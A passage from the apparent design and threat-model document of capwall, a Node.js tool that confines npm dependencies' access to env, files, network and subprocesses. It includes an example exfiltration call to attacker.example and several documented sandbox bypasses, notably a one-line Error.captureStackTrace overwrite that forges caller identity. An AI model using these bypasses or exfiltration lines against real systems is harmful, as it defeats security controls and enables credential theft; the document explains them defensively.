  reads `NODE_V8_COVERAGE`; `express` genuinely reads `NODE_ENV`), and a name denylist could not
  tell those from the false ones because the names are identical.

  **It changes recording only, never gating** — the same shape as the #67 decision above. The
  read is still attributed, still evaluated against the attributed package's grants, and still
  hidden when they do not cover it. It has to be: a dependency *can* put a `node:` frame directly
  above a read it caused (`util.inspect(process.env)` runs in `node:internal/util/inspect`), so a
  "Node did it, allow it" rule would be a one-call laundering route around the whole
  anti-exfiltration control. A frame that merely *claims* a `node:` name does not qualify either:
  an `eval` frame is opaque before its self-reported name is consulted (§ `eval` and
  `new Function`), a native frame has no name at all and fails closed, and compiling under a
  `node:` filename is what the `compile` gate denies.

  *Residuals, both bounded:* (1) a denied Node-initiated read is not logged, so a
  `util.inspect(process.env)` probe is blocked but silent — the same trade the descriptor trap
  makes, and for the same reason. (2) `vm` compiles under a caller-chosen filename, so a package
  holding a `vm` grant can synthesize a `node:`-named frame and read env unrecorded; it still
  cannot read a value it is not granted, and `vm` is already documented as identity-granting
  (§ `compile`). *Operational cost:* Node's own reads no longer generate grants, so under
  `enforce` those variables read as unset to Node — `--watch` does not report dependencies
  through this path, `NODE_V8_COVERAGE` does not reach the source-map cache, cluster uses its
  default scheduling policy. They are Node's own configuration knobs and they degrade to the
  unset default.

  **Spawning and env (#89).** Node reads `process.env` while assembling a child's environment
  block, from a stack whose nearest frame is the spawning dependency — indistinguishable from
  that dependency reading the key itself. Gating those reads would launch the child with no
  `PATH`/`HOME`, so something has to give. capwall used to bracket the **entire real spawn call**
  with a process-wide suspension of the env gate, and forward the caller's options object
  unpinned. Node reads that object *inside* the bracket, so a getter on `options.cwd` ran with
  the gate off and copied every value out of `process.env` — unrecorded, and not even limited to
  the spawning package: any other dependency reached from that getter read ungated too. That was
  issue #89.

  It is now handled in two independent ways, neither of which is a general suspension:

  - **The options object is pinned.** Every own accessor on it is invoked exactly once, on
    capwall's own stack, *before* the real call, and flattened into a data property; the object
    handed to Node contains no getters. This is the same rule, and now literally the same
    helper (`shims/pin.ts`), that `net` has applied since #26/#56. A caller's getter therefore
    runs at a moment when nothing has been relaxed, and its env reads are gated and recorded
    like any other read by that package.
  - **The whole-environment read is eliminated, not exempted.** capwall always supplies an
    explicit `options.env` — snapshotted from the un-proxied environment when the caller supplies
    none — so Node's `options.env || { ...process.env }` never enumerates the proxy at all.

  **What remains inside the window.** Node reads a small fixed set of variables *by name*
  regardless of what the caller passed, and capwall cannot remove those reads from outside Node.
  Exactly those keys — `NODE_V8_COVERAGE` on every platform, `comspec` on win32 with
  `shell: true`, and nine z/OS codepage/redirect variables on `os390` — pass ungated, by exact
  string match, and only while a real spawn is on the stack. Every other key stays gated and
  recorded, for every package, including inside the real call. Nested objects the caller supplies
  (`options.env`'s own keys, `options.stdio` entries' `fd`/`handle` getters, a duck-typed
  `options.signal`, `toString` on an `args` element, a `URL` subclass as `cwd`) are values rather
  than fields, so they are not flattened and their accessors *can* still run inside that window —
  which is precisely why the exemption is scoped to keys rather than to wall-clock duration.
  `new ChildProcess().spawn(options)` opens no window at all: it consumes an already-built
  `envPairs` and Node's `internal/child_process.js` reads no `process.env`.

  *Residual:* caller-controlled code running inside a spawn can learn whether (and to what)
  those listed variables are set. They name a coverage output directory, the Windows command
  interpreter, and z/OS stream settings; none can carry an application secret. Those reads are
  also not recorded, on the same reasoning as `CAPWALL_*` — they are Node's plumbing, and
  recording them would widen every generated policy with a key no dependency asked for.

  **Writes are NOT mediated (#66).** `env` grants are a *read* allowlist; a dependency may set,
  delete, and `defineProperty` on `process.env` freely, exactly as un-shimmed. The proxy's `set`
  trap exists only to restore ordinary assignment semantics — without it, assignment to an
  already-set key crashed the host app with `ERR_INVALID_OBJECT_DEFINE_PROPERTY`. *Residual:* a
  dependency can set `NODE_OPTIONS`, `LD_PRELOAD`, `NODE_EXTRA_CA_CERTS` or proxy variables to
  influence other code. In-process this is largely inert (`NODE_OPTIONS` is consumed at startup,
  before any dependency runs); its payoff is in a **child process**, and spawning is already a
  gated capability, so the spawn is the control point. A proxy variable that redirects egress is
  still subject to the `net` gate, which guards the target actually connected to. Gating writes
  would require write-grant vocabulary the policy language does not have, and soft deny does not
  compose with writes (a silently dropped write leaves the dependency believing it succeeded; a
  throwing write reintroduces the crash). Tracked as a policy-language question, not a bug.

**Capability-bearing classes are guarded subclasses, not Proxies.** Where a capability can be
reached through a class rather than a module function, capwall replaces the class with a
**subclass it owns**, whose constructor (or prototype method) runs the check before delegating,
plus a `Symbol.hasInstance` override so `instanceof` still answers correctly for instances
built by the real builtin's own factories. That covers `fs.ReadStream`/`WriteStream` (and the
`File*Stream` aliases), `vm.Script`/`SourceTextModule`/`SyntheticModule`,
`worker_threads.Worker`, `net.Socket`, `tls.TLSSocket`, `http(s).ClientRequest`,
`http(s).Agent`, `dgram.Socket`, and `child_process.ChildProcess`.

That `Symbol.hasInstance` override checks its **receiver** before answering permissively (#71).
The method is inherited down the static chain, so a dependency writing the entirely ordinary
`class Mine extends net.Socket {}` used to get a subclass that reported `someUnrelatedRealSocket
instanceof Mine === true`, where un-shimmed Node says `false`. That was a correctness deviation
rather than a bypass, but silently inverting a package's type dispatch is not a thing a security
tool should do; the override now falls back to ordinary prototype-chain semantics for any
receiver that is not the guarded class itself, and one shared implementation
(`shims/runtime.ts`) serves every guarded class.

**Capability-bearing instances are guarded views (#65).** A builtin namespace does not only
export functions and classes — it can export a live, pre-built **instance** that already carries
the capability, and each shim's namespace-copy loop duplicated those through with their real
methods intact. `http.globalAgent`/`https.globalAgent` were exactly that: any dependency could
call `http.globalAgent.createConnection({host, port})` and connect under a deny-all `enforce`
policy, with **no log line** — the unlogged part being the worse half, since egress is the
payload step of the attack class capwall exists to contain and `observe`/`capwall diff` could
not surface it. Both are now wrapped in a guarded **view**: a `Proxy` that forwards live agent
state to the one real agent (so the shared, process-global connection pool, `maxSockets`,
keep-alive, `agent.sockets` and `instanceof` all keep working — `globalAgent` is on the default
path for nearly every HTTP call) and replaces only `createConnection`, which is gated with the
same resolver the guarded `Agent` subclass uses.

A `Proxy` is the right tool *here* and remains the wrong one for a class: the #64 objection is
that a proxied class's `.prototype.constructor` is the real class, and an instance has no
`.prototype` to leak through. The alternatives were worse — a freshly constructed guarded agent
would be a *different* pool (so `http.globalAgent.maxSockets = N` would silently stop affecting
real requests), and patching the real instance's method would mutate a **process-global that
outlives `uninstall()`**, which is the same constraint that keeps real builtins unfrozen.

**What that view refuses, and the one thing it deliberately still forwards (#88).** The first
version of the view had a `get` trap and nothing else, so every other operation took its default
behaviour — forward to the Proxy's target, which was the real process-global agent. The guard
itself held (the `get` trap re-wraps whatever the underlying method currently is, so replacing
`createConnection` never bypassed a check), but a dependency could permanently reshape a
process-global *through capwall*, `uninstall()` could not take it back, and
`Object.freeze(http.globalAgent)` wedged the HTTP client for the whole process. That is the same
hazard that moved the guarded classes off Proxies in #64, at the one site where the reasoning had
not been re-applied. The view's Proxy target is now an **empty object capwall owns**, so no
default trap behaviour and no Proxy invariant can reach the real agent, and each operation is
answered deliberately:

- **Live agent state** — `get`/`set` of any key that is not a guarded method, plus `has`,
  `ownKeys`, `getOwnPropertyDescriptor` and `getPrototypeOf` — is **forwarded**. This is the one
  place capwall's guarded view still writes to a process-global, and it is the reason the view
  exists at all: `http.globalAgent.maxSockets = 100` has to keep tuning the pool that Node's
  default request path actually uses. Un-shimmed Node does exactly the same thing, so capwall
  neither adds nor removes a hazard here; shadowing the write instead would silently detune the
  real request path while the caller believed otherwise.
- **Guarded methods** (`createConnection`) — a read always yields capwall's wrapper, and a write
  is kept in a **per-view shadow** rather than forwarded. Those keys are not pool state, so
  nothing legitimate needs them shared. A write and a later read still agree, the guard still
  wraps whatever was installed, and the edit disappears with the view at `uninstall()`. The cost
  is a bounded divergence: a package that replaces `createConnection` on the view does not
  replace it for code holding the raw agent.
- **Structural operations** — `defineProperty`, `deleteProperty`, `preventExtensions`
  (`Object.freeze`/`seal`) and `setPrototypeOf` — are **refused**, for every key. Each one
  forwarded is an irreversible edit to a process-global, and two of them (a non-writable pin on a
  field Node's own bookkeeping assigns to, a delete of pool state) wedge the process's HTTP client
  exactly as the freeze did. A refusal surfaces as a `TypeError` at the call site under strict
  mode — loud and local, where forwarding was silent and global. This is a **deliberate deviation
  from un-shimmed Node**, which permits all four.

The virtual target also settles a Proxy-invariant problem the first version could not. A `get`
trap must return the target's actual value for a non-configurable, non-writable target property,
so with the real agent as the target a single
`Object.defineProperty(realAgent, "createConnection", {writable: false, configurable: false})`
from any un-mediated code turned every read of `http.globalAgent.createConnection` in the process
into a `TypeError` — where un-shimmed Node returns a value — and the only invariant-satisfying
alternative would have been to hand back the **unguarded** pinned method. A target with no own
properties satisfies every invariant unconditionally, so the guarded wrapper is always what comes
back. One consequence to know about: because the target owns nothing, the view must report every
property as `configurable: true`, whatever the underlying object says. Nothing can act on the
difference — `defineProperty` and `deleteProperty` are refused regardless.

The audit behind #65 walked every object-valued export of every shimmed namespace on Node 20 and
22. `http.globalAgent` and `https.globalAgent` were the only capability-bearing ones; the rest
are inert data (`fs.constants`, `http.METHODS`, `http.STATUS_CODES`, `tls.rootCertificates`,
`http2.constants`, `vm.constants`, `worker_threads.resourceLimits`) or an already-shimmed
sub-namespace (`fs.promises`).

**Global egress surfaces are mediated as of #80 — but by a different mechanism, with its own
limits.** Everything else capwall intercepts arrives through a module load: `require`/`import`
hands back a shim. `fetch`, `WebSocket` and `EventSource` are **globals**, never imported, so the
loader mechanism never sees them. Before #80 that was a plain gap, not a determined-attacker
residual: a dependency calling
`fetch("https://attacker.example/", {method:"POST", body: secret})` under a **deny-all `enforce`
policy** exfiltrated successfully with **zero decisions recorded** (confirmed empirically during
the #65 audit) — one line, no reflection, no `require` for a reviewer to grep for, and invisible
to `observe`/`capwall diff` as well.

capwall now installs a **global egress guard** (`shims/global-egress.ts`), which replaces those
globals with guarded equivalents for the life of the install. What it covers and how it behaves:

- **Which globals.** Enumerated against the supported range (Node 20.19 / 22.22 / 24.5, with and
  without the relevant `--experimental-*` flags), not guessed: `fetch` (present everywhere),
  `WebSocket` (Node ≥22 unflagged; `--experimental-websocket` on 20) and `EventSource`
  (`--experimental-eventsource` on every supported version). Each is replaced **only if it is
  already present**, so a flag-only API is picked up when the flag is on and nothing is invented
  on a Node that lacks it. `navigator.sendBeacon` **does not exist in any supported Node** —
  Node's `navigator` carries `userAgent`/`platform`/`language(s)`/`hardwareConcurrency` only — so
  there is deliberately no guard code for it.
- **How a FUTURE global egress API is caught.** `test/global-egress-inventory.test.ts` enumerates
  `globalThis` in a clean child process and fails when a name appears that is in neither the
  guarded list nor a reviewed-inert list, and separately asserts `navigator.sendBeacon` is still
  absent. A new global cannot land in a Node minor release without breaking that test and forcing
  someone to classify it. That test is the control; the table above is just its current state.
- **`http.WebSocket`** (Node ≥22 re-exports the same class onto the `http` namespace) is guarded
  too. While the global was un-mediated, shimming that copy bought nothing; now that the global is
  guarded, the module copy would be the remaining one-liner. Note the one deviation: the two
  guarded copies are not `===` to each other the way the real ones are. `instanceof` still answers
  correctly for both.
- **Policy shape: the existing `net` grant**, not a new capability. A dependency dialing
  `example.com:443` holds the same authority whether it got there through `http.request`,
  `net.connect` or `fetch`; splitting them would let a policy grant one and not the other by
  accident. Every existing policy, `observe` trace, `gen-policy` output and `capwall diff` covers
  the new surface with no schema change.
- **Target derivation reuses the single-read pinning** the `net` shim uses (`shims/url-snapshot.ts`,
  shared by both so they cannot drift). This is the #26/#56 TOCTOU class and both shapes were
  verified to be exploitable without it: a `URL` whose `toString` answers differently on the second
  read sends the request to the **second** value; and a `Request` with an OWN shadowed `url`
  accessor reports whatever the attacker chose while undici dials the real internal URL — so the
  guard reads a `Request`'s destination through the **real `Request.prototype.url` getter**, which
  reaches the same state undici dials from and steps over the shadow. For strings and `URL`s,
  capwall performs exactly one `String(input)` — the same conversion undici performs — and forwards
  that immutable string, so there is no second read left to diverge.
- **Attribution is unchanged and lands on the dependency.** The guard runs synchronously, on the
  caller's own stack, before the first `await`, so a dependency's `fetch` is charged to that
  dependency — not `<app>`, and not `<unknown>` (which would have forced every real app to grant
  `<unknown>` just to use `fetch`). A dependency that detaches first
  (`setTimeout(() => fetch(evil))`) is `<unknown>` and denied by default, exactly like every other
  laundering shape since #60.
- **A denial is delivered through the channel the real API uses**, same rule as `fs` (see
  "Behavior change vs. real `fs`" below). Real `fetch` **never throws synchronously** — every
  failure, including an unparseable URL or calling it with no arguments, arrives as a rejected
  promise (verified on Node 20 and 22) — so a denied `fetch` **rejects** with a `CapabilityError`
  rather than throwing, or `fetch(url).catch(handle)` would crash with an uncaught exception it
  would never see from real `fetch`. `new WebSocket(…)` / `new EventSource(…)` *do* throw
  synchronously on a bad argument, so a denial there throws, matching. The guard itself always
  runs synchronously on the caller's stack; only the delivery of the outcome differs.
- **`data:` and `blob:` are not gated** — they resolve in-process and move no bytes onto a network,
  so gating them would deny-by-default an inert `fetch("data:…")`. Every other scheme IS gated,
  including ones capwall does not recognize (fail-closed).
- **`uninstall()` restores the originals** and leaves no capwall object on `globalThis`. The
  replacement property is installed `configurable: true` **even under hardened mode**, because a
  non-configurable global could never be restored by anyone — the same process-global constraint
  that keeps real builtins unfrozen (#77) and that shaped #65's Proxy-view approach. Restoration is
  skipped if something else replaced the global after capwall, so a later legitimate replacement is
  not clobbered. A dependency that **captured** the guarded `fetch` before teardown still holds it,
  and it follows the live policy like any other capture — see § Install lifecycle (#87).
- **Hardened mode (#17)** installs the guarded global `writable: false` (so `globalThis.fetch =
  evil` silently no-ops in sloppy-mode CJS and throws under `"use strict"`) and freezes the wrapper
  function / guarded class. The pin is a **ratchet**: it is applied by `refresh` on every install,
  so a hardened install stacked on an un-hardened one still gets it, and it is never lifted while
  any install remains — only the final restore of the saved descriptors removes it (#129; the
  egress side is where that rule started, and #129 extended it to the shim registries too).
  `Object.defineProperty(globalThis, "fetch", …)` remains open — the same
  class of residual as climbing past a guarded prototype, and the price of a restorable global.
- **Switchable off**: `install(…, { globalEgress: false })` / `CAPWALL_GLOBAL_EGRESS=0`, for a
  process where writing to `globalThis` is unacceptable.

**Global egress residuals, named.**

1. **Redirects are guarded only after the fact.** `redirect: "follow"` is fetch's default and the
   following happens inside undici, where capwall has no interception point: by the time anything
   is observable, the request — body included — has already reached the redirect target. capwall
   guards the **final origin** on the response, so the hop is **recorded** (visible to `observe`,
   `gen-policy` and `capwall diff`) and, in `enforce`, the response body is cancelled and the call
   rejected with a `CapabilityError` rather than handing the dependency the attacker's reply. That
   contains the *response*, not the request. Re-implementing redirect following on
   `redirect: "manual"` was considered and rejected: `Response.url` and `Response.redirected` are
   computed from internal state a userland re-issue cannot set, so every redirect-following `fetch`
   in the process would start reporting `url: ""` / `redirected: false`, and 307/308 body replay is
   not expressible for a stream body — a behavioral break on ordinary traffic in exchange for a hop
   whose target the attacker does not choose. Intermediate hops in a chain are not visible at all;
   only the final origin is.
2. **`init.dispatcher`.** Node's `fetch` honors undici's non-standard `dispatcher` option, which
   lets the caller supply the code that opens the socket — verified to be reachable with a plain
   hand-rolled object. This is the same class as the `options.createConnection` residual already
   documented for `http(s)`: capwall guards the target it derived, and a dispatcher that dials
   elsewhere is only re-gated if the module it dials through is itself mediated (userland
   dispatchers, including the npm `undici` package's, reach the network through `net`/`tls`, which
   ARE mediated). capwall does not strip the option, because doing so would break legitimate
   `ProxyAgent`/`MockAgent` interop.
3. **Pre-install capture.** A module that captured `globalThis.fetch` before capwall installed
   holds the raw function — the same residual as every other shim. Install via the `--import`
   preload.
4. **Undici does not route through the mediated modules**, so there is no `net`-shim backstop
   behind any of this — see the note under `net`/`http` below.

The earlier approach for some of those sites was a construct-trap `Proxy`, which **did not
hold**: a `Proxy` forwards property reads to its target, so the proxied class's `.prototype`
is the real prototype and `Cls.prototype.constructor` is the real, unguarded class. A single
line — `new (fs.ReadStream.prototype.constructor)(deniedPath)` — read any file, evaluated any
code (`vm.Script`), or spawned a worker (`worker_threads.Worker`) with the guard never firing.
The worker case was the worst of the three, because a worker is a fresh Node context with none
of capwall's shims in it. All such sites are now subclasses, and a regression test asserts the
`.prototype.constructor` invariant over **every** guarded class in the codebase (issue #64).
A second benefit of that conversion: a subclass is an object capwall owns, so opt-in hardened
mode (#17) can freeze it — a `Proxy` could not be frozen without freezing the real builtin
class it wraps.

**Residual, unchanged:** climbing PAST the guarded subclass still reaches the real method or
class — `Object.getPrototypeOf(fs.ReadStream.prototype).constructor` from the class object, or
two prototype levels up from an instance. That is the same class of escape as un-patching a
shim outright: in-process code deliberately climbing above the guard. capwall does not claim to
stop it. A guarded subclass raises the cost of the accidental and the opportunistic walk; it is
not a boundary.

**Attribution outcomes: `<pkg>`, `<app>`, `<unknown>`.** Every mediated call is charged to one
of three principals. A frame under `node_modules/<pkg>` charges that package — **including one
that got there through a symlink**, which since #127 is resolved back to the `node_modules` entry
it was reached through rather than to the realpath (see § Package identity). A real source file
under **no** `node_modules` and **inside the project root** charges `<app>`, the trust root.

**What the trust root is actually exempt from — five gates, not two.** This list reads as
exhaustive, so it is worth writing out in full, and it is worth **re-deriving** rather than
edited: it said "two" for three releases while three more exemptions were added by later PRs,
here and in `docs/architecture.md`, `docs/policy-format.md` and `packages/core/README.md` at
once. The derivation is mechanical — every `pkg === APP_ROOT` early return in
`packages/core/src` is one of these, and a new one means this table is stale:

| Gate | Site | What `<app>` skips |
|---|---|---|
| `process.env` reads | `shims/env.ts` | the `env` read allowlist |
| `dgram` send/connect | `shims/net.ts` | the `net` grant, for UDP only |
| loader-hook registration (#61) | `shims/module.ts` `guardRegistration` | `module.register` / `registerHooks`, which are otherwise application-only |
| `Module.prototype._compile` (#93) | `shims/module.ts` `guardCompile` | the **`compile`** capability |
| module-load read (#123) | `loader/module-read.ts`, both the CJS and ESM halves | the `fs.read` decision on `require`/`import` of a file outside every `node_modules` tree — see § The module system as a read channel |

The `_compile` row is the one to hold on to, because this document calls `compile` *"identity-granting:
a package holding it can execute as any principal in the policy, including `<app>`"* and *"a grant
of every other grant"* — and `<app>` needs no such grant. It already has it. So the blast radius of
a misattribution to `<app>`, or of application code being persuaded to compile attacker-supplied
source under a chosen filename, is not "the app's `env` and `dgram` grants": it is the ability to
name any principal in the policy and run as it. Note also what is **not** on this list: the
`native` `.node` gate does not exempt `<app>` — the project's own build output is charged to
`<app>` and still needs a `native` grant (`loader/native.ts`).

Everything else — no qualifying frame on the stack at
all, app code reached only *through* code with no filesystem identity (a `data:`/`blob:` module,
any `eval`/`new Function` frame, a bundler `//# sourceURL=`, `node -e`/stdin), or a real source
file outside the project root that no `node_modules` entry points at — charges `<unknown>`.

Only a frame's `getFileName()` is used to name a package, because that is the one thing V8
reports from how the code was **loaded** rather than from what the code **says about itself**.
See § `eval` and `new Function` below for the one place capwall got that wrong.

`<unknown>` is an ordinary principal, not an exemption: deny-by-default in `enforce`, recorded
in `observe`, and grantable with an explicit `"<unknown>"` entry in `capabilities.json`. That
entry is the **escape hatch** for a setup that legitimately runs from path-less frames.
(Until #119 every generated policy carried one, because Node's own ESM loader reads
`process.env.WATCH_REPORT_DEPENDENCIES` from such a stack on every run. That read is Node's own
and is no longer recorded — see the § Node-initiated env reads residual — so a fresh policy no
longer grants `<unknown>` anything.) Granting `<unknown>` broadly (`"env": ["*"]`, a wide `net` grant) hands that
authority to **every** call capwall cannot attribute, including a dependency deliberately
running from a `data:` module — so the preload prints a one-line warning at startup when a
policy grants it **broadly**. "Broadly" is a precise test, not a figure of speech
(`preload.ts` § `isBroadGrant`): the warning fires in **`enforce` only**, and only when the
`<unknown>` entry holds something other than a concrete, wildcard-free list of `env` keys — any
other capability, or `env: ["*"]`. A concrete `env` list stays silent because it is a narrow,
reviewed line, and warning on one is the cry-wolf failure #67 removed from the env trace.
(It used to be the near-universal shape, which is why the exception exists; since #119 most
policies grant `<unknown>` nothing at all.) Keep the grant as narrow as the observed keys.

Before this split (issue #60), "could not attribute" and "this is the app" were the same value.
See the § attribution laundering residual for what that cost and what remains.

**Behavior change vs. real `fs` (operational note).** In `enforce` mode a denial is delivered
via the SAME channel the real `fs` API would use for that call, not always a synchronous
throw — chosen specifically so idiomatic (try/catch-free) code is not crashed by an uncaught
exception it would never see from real `fs`:

- **`*Sync` methods** (`readFileSync`, …) throw `CapabilityError` synchronously — matches
  real sync `fs`.
- **`fs.promises` methods** reject with `CapabilityError` — matches the real promise API.
- **Callback-style async methods** (`readFile`, `mkdir`, `access`, `rm`, …) invoke the
  caller's own callback as `cb(err)` on `process.nextTick`, exactly as a real async `fs`
  error would arrive, instead of throwing. If the call is missing a callback (a mis-call),
  the shim falls back to a synchronous throw, matching real Node's behavior for the same
  mis-call.
- **`createReadStream`/`createWriteStream`** return a minimal stream (with `.path` set) that
  holds the `CapabilityError` and emits `'error'` with it **as soon as an `'error'` listener
  is attached** to the stream — not on a fixed timer — so a handler attached synchronously,
  on a microtask, on `setImmediate`, or on `setTimeout(0)` is always caught (fix #40; this
  closes the earlier parity gap, where a fixed `setImmediate` delivery could fire before a
  handler attached on a later macrotask, producing an uncaught `'error'` even though the
  consumer did handle errors). A sync throw here would still be a bypass-shaped surprise,
  since `fs.createReadStream(p).on('error', h)` is the idiomatic pattern and never throws
  synchronously in real Node either. If `'error'` is never listened for at all, a safety net
  still delivers the denial after two event-loop phases, so an unhandled denial ultimately
  crashes the process — same as real `fs` would for an unhandled async error — rather than
  silently hanging forever. This is **fail-closed** either way — the read/write never happens.
- **`watch`/`watchFile`** and the `ReadStream`/`WriteStream` **class constructors**
  (`new fs.ReadStream(deniedPath)`) throw synchronously on denial. `fs.watch` and a real
  stream constructor also throw synchronously on a bad argument, so those match. `fs.watchFile`
  is the exception: real `watchFile` does NOT throw (it calls its listener with zeroed stats),
  so the shim's sync throw there is a deliberate loud-failure choice — `watchFile`'s listener
  is `(curr, prev)`, not error-first, so there is no faithful channel to deliver the denial
  through.
- **Byte path arguments** (any `Uint8Array`, `Buffer` included) are decoded with `latin1`
  (byte-exact — fix #19). **Re-examined and confirmed under #41**, on this reasoning rather than on
  inertia: `latin1` is a *bijection* between byte sequences and strings, so the string that was
  matched against policy determines the bytes that reach the real `fs` uniquely, and "the author
  believes a path is denied but it matches" is **unreachable** — no second byte sequence shares
  the matched string. `utf8` is not injective (every invalid subsequence collapses to a single
  U+FFFD), so many distinct byte paths share one string: granting the path an `observe` run
  recorded would silently grant all of them, and the audit trail could not say which file was
  read. A **false-allow in an anti-exfiltration control is the failure that matters**; a
  false-deny is loud and fail-closed. The residual cost is exactly that false-deny: a **valid
  non-ASCII UTF-8 path passed as bytes** (`Buffer.from("./data/café.txt")`) decodes to a different
  string than the UTF-8 one a policy glob is authored in, so it is refused. Uncommon, pinned by
  test, and not going to change silently. The third option #41 raised — normalizing *both* sides
  into byte space so a `café` grant matches `café` bytes — works, and was rejected on DX: it turns
  every non-ASCII path in an `observe` trace and in a generated policy into a latin1 byte-string,
  making the common case (a non-ASCII path passed as an ordinary string) unreadable in order to
  fix the rare one. The bytes capwall checked are also the bytes it forwards: the real `fs`
  receives capwall's own **copy**, not the caller's live array, because Node reads
  `options.encoding` before it opens the path — so a getter there can rewrite the array in place
  between the two (verified in plain Node), which is the byte-path flavor of the #26/#56 pin.
- **`exists`/`existsSync`** remain the bespoke non-throwing existence probes: a denial reads
  as "does not exist" (`false` / `cb(false)`), never an error at all.

This is unchanged in spirit from before — enforce mode still fails loudly and a policy gap
still surfaces as a real error, not a silent allow — only the DELIVERY CHANNEL now matches
what the real `fs` API would use for that call shape. This is most likely to matter during
the observe→tighten→enforce rollout while a policy is still incomplete; run `observe` until
coverage is stable before flipping to `enforce`. Path matching is POSIX-oriented
(`/`-separated); Windows drive-letter paths are not matched by relative grants yet.

## Adversary we are designed to stop

**Opportunistic, worm-style supply-chain malware** delivered through a compromised npm
dependency. Concretely, the class exemplified by:

- **Shai-Hulud** (Nov 2025) — a self-propagating npm worm.
- **Glassworm** (2026) — malware that runs at **both** the lifecycle-script (install) phase
  **and** the application-runtime phase.

The critical observation: these payloads execute at **application runtime**, not only at
install. Install-time defenses — lockfile pinning, `--ignore-scripts`, registry scanners,
socket brokers — never see the runtime phase, where credential theft, wallet drain, and
lateral movement actually happen. capwall lives in the running process and mediates that
phase.

Such malware is typically **opportunistic**: it tries to read `process.env`, open a socket
to an exfiltration host, spawn a shell, or write to a persistence path. It does **not** go
out of its way to break out of a capability shim. That is exactly the behavior capwall's
per-package capability policy catches: a logger that suddenly opens a network socket, or a
string-formatting helper that reads environment secrets, is a policy violation.

## What capwall stops

When a package's declared capabilities are tight, capwall denies (in `enforce` mode) or logs
(in `observe` mode) attempts by that package to:

- Read/write files outside its allowed path globs (`fs`) — including through the module system:
  `require("/abs/secrets.json")` / `import(url, { with: { type: "json" } })` is an `fs.read`
  decision on the resolved file whenever that file belongs to no installed package (#123).
- Open network connections to hosts/ports outside its allowlist — through the `net`, `http(s)`,
  `tls`, `http2` and `dgram` **module** surfaces, and (since #80) through the **global** APIs
  `fetch`, `WebSocket` and `EventSource`. All of them evaluate against the same `net` grant. See
  "Global egress surfaces" above for the global guard's own limits, chiefly redirects.
- Spawn subprocesses when `child_process` is not permitted (**gating** the spawn).
- Spin up `worker_threads` when not permitted.
- Read `process.env` keys outside its allowlist (e.g. exfiltrating `AWS_SECRET_ACCESS_KEY`
  from a package with no reason to see it).
- Use `vm` when not permitted.
- Load a native `.node` addon when not permitted (**gating** the load only — read
  § Native `.node` addons before granting it).

The **trace→policy DX** makes those policies practical to author: run once in `observe`,
emit a starter policy scoped to what each package *actually* did, tighten it, enforce.

## What capwall does NOT stop (out of scope for confinement)

capwall does **not** harden JavaScript primordials (that is SES's job — see below). Without
frozen primordials, a **determined in-process attacker** can defeat it via, among others:

- **Shared mutable primordials** — and the one that matters is `Error`, because capwall's
  bookkeeping lives there. The worked example for this class is deliberately **not** prototype
  pollution and **not** un-patching a shim; it is this, which is the cheapest escape anywhere in
  this document:

  ```js
  Error.captureStackTrace = (h) => {
    h.stack = [{ isEval: () => false, getFileName: () => "node:internal/modules/cjs/loader" }];
  };
  ```

  capwall asks V8 for the stack in exactly two places and that line defeats **both**:
  `calledByNodeLoader` (`shims/module.ts`, the `compile` gate's "is this Node's own loader?"
  check) answers yes for any caller, and the attribution walk (`attribution/index.ts`) returns
  whatever principal the fabricated CallSite names. Verified against a deny-all `enforce`
  policy: a dependency holding **no grant at all** called `Module.prototype._compile` with an
  arbitrary filename and it was **ALLOWED with no decision recorded** — no `DENY`, no `ALLOW`,
  nothing for `observe` or `capwall diff` — where the identical call one statement earlier was
  denied and logged. Swapping the fake file name for a granted package's path mints that
  package: the same dependency then read an `env` key granted only to `trusted`, got the value,
  and the read was charged to `trusted`.

  Three things make this, rather than shim un-patching, the honest characterization of the class:

  - **One line, and it does not have to stay in place.** The real `Error.captureStackTrace` goes
    back on the next statement, so the escape is **self-restoring**: no persistent artifact, no
    surface left in a modified state, nothing for a later audit or a liveness check to notice.
    Un-patching a shim is the opposite — the patch has to remain in place for the escape to keep
    working, and it visibly mutates an object other packages hold references to.
  - **Hardened mode does nothing about it.** Stated flatly because the adjacent bullets *do*
    claim partial hardened-mode coverage, so the contrast is otherwise invisible and a reader who
    enabled hardened mode will reasonably conclude this class is handled. It is not. `Error` is a
    primordial capwall does not and cannot freeze: freezing it breaks every library that formats
    a stack trace or calls `Error.captureStackTrace` on its own error classes, and — being a
    process-global — the freeze would outlive `uninstall()`, the same constraint that keeps the
    real builtins (#77), `process.env` and `Module.prototype._compile` unfrozen. Hardened mode
    closes the reassignment half of the un-patching bullet below and none of this one.
  - **It is strictly more powerful than un-patching.** Un-patching *disables* enforcement for
    whoever un-patched (and, being a shared singleton, for everyone else). This *mints identity*:
    the caller chooses which principal capwall believes is running. That composes with the two
    facts elsewhere in this document that make identity the whole game — `compile` is
    identity-granting, "a grant of every other grant", and `<app>` is exempt from five gates
    outright (§ What the trust root is actually exempt from). Forging `<app>` costs the same one
    line as forging Node's loader.

  **Prototype pollution proper** — mutating `Object.prototype`/`Array.prototype`/etc. to
  influence code in other packages — is the rest of this class and is equally out of scope.
  Freezing the primordials is SES's job; see § vs SES / hardened primordials. capwall does not
  attempt a detection heuristic here either: a check for a replaced `Error.captureStackTrace`
  would itself run in the process the attacker controls, and a spoofable guard inside the
  attribution layer is worse than a documented bound (the same reasoning that rejected the
  `ownKeys` enumeration-epoch heuristic under § Name-level vs value-level).
- **Un-patching the shims** — reaching for the original, un-wrapped core module reference and
  calling it directly. This is **cheap, not exotic** (though not the cheapest escape in this
  section — that is the bullet above, and hardened mode reaches this one and not that one):
  capwall returns a plain, mutable shim
  object (deliberately un-frozen, so legitimate `fs` monkey-patchers such as `graceful-fs`
  keep working — the no-SES-tax tradeoff). A dependency can reassign the shim's methods, or
  reach the raw builtin through channels capwall does not mediate. Both the CJS `require` and
  the ESM `import` paths ARE mediated (M4/M5), so `require("node:fs")` and
  `import … from "node:fs"` both return the shim — but capwall does not chase every reflective
  escape hatch, and at least one is a **plain public API**: `process.getBuiltinModule("node:fs")`
  (Node ≥22) returns the real, un-shimmed module, as does `process.binding`, internal module
  caches, or a builtin loaded from a context capwall has not patched. `getBuiltinModule` is
  path-independent (it defeats the CJS patch identically), so this is not specific to ESM. The
  shim is a **shared, process-wide singleton**, so a single dependency that does un-patch it
  **silently disables enforcement for every other package and the app**, not just for itself,
  with no log line. Treat capwall's mediation as effective only against packages that do not
  go looking for the raw builtin. **Opt-in hardened mode (#17) closes the reassignment half of
  this** — see § Hardened mode below for exactly how much, and how little, that buys. It does
  nothing about `getBuiltinModule` and the other raw-builtin paths in this bullet. On the ESM
  path specifically, **hijacking the loader-hook chain** is a second route with the same
